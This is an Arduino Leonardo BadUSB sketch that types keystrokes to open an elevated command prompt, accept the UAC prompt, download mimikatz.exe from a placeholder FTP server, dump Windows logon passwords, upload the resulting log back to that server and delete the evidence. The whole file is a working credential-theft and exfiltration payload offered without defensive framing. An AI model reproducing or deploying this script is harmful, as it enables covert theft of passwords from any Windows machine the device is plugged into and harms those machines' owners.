#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("cmd");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(4000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("ftp");
  delay(3000);
  Keyboard.println("open IPSERVERFTP");
  delay(10000);
  Keyboard.println("USERNAME");
  delay(3000);
  Keyboard.println("PASSWORD");
  delay(5000);
  Keyboard.println("binary");
  delay(2000);
  Keyboard.println("GET mimikatz.exe");
  delay(5000);
  Keyboard.println("bye");
  delay(3000);
  Keyboard.println("mimikatz.exe");
  delay(4000);
  Keyboard.println("log");
  delay(2000);
  Keyboard.println("privilege::debug");
  delay(3000);
  Keyboard.println("sekurlsa::logonPasswords full");
  delay(10000);
  Keyboard.println("exit");
  delay(3000);
  Keyboard.println("ftp");
  delay(3000);
  Keyboard.println("open IPSERVERFTP");
  delay(10000);
  Keyboard.println("USERNAME");
  delay(3000);
  Keyboard.println("PASSWORD");
  delay(5000);
  Keyboard.println("PUT mimikatz.log");
  delay(3000);
  Keyboard.println("bye");
  delay(3000);
  Keyboard.println("del mimikatz.exe & del mimikatz.log");
  delay(3000);
  Keyboard.println("exit");
  while(1);
}
